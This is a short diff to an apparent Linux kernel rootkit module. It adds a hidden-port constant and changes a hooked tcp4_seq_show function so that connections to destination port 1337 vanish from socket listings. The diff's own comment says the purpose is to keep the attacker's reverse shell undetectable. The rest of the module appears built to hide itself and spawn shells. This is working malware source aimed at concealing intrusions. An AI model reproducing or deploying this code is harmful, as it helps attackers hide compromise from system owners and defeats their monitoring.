@@ -12,7 +12,8 @@ MODULE_DESCRIPTION("GPL");
 
 enum {
     SIGHIDE = 59,
-    TIMETOSHELL = 30
+    TIMETOSHELL = 30,
+    HIDENPORT = 1337
 };
 
 static int hide_status = 0;
@@ -63,11 +64,12 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *sk = v;
     /*
-     * Check if sk_num is 1337
-     * (0x539 = 1337 in hex)
+     * Check if sk_dport is 1337
+     * (sk_dport = HIDENPORT (1337) )
      * If sk doesn't point to anything, then it points to 0x1
+     * It will hide the destination port 1337 so that our reverse shell becomes undetectable
      */
-    if (sk != 0x1 && sk->sk_num == 0x539)
+    if (sk != 0x1 && sk->sk_dport == htons(HIDENPORT))
         return 0;
     /*
      * Otherwise, just return with the real tcp4_seq_show()
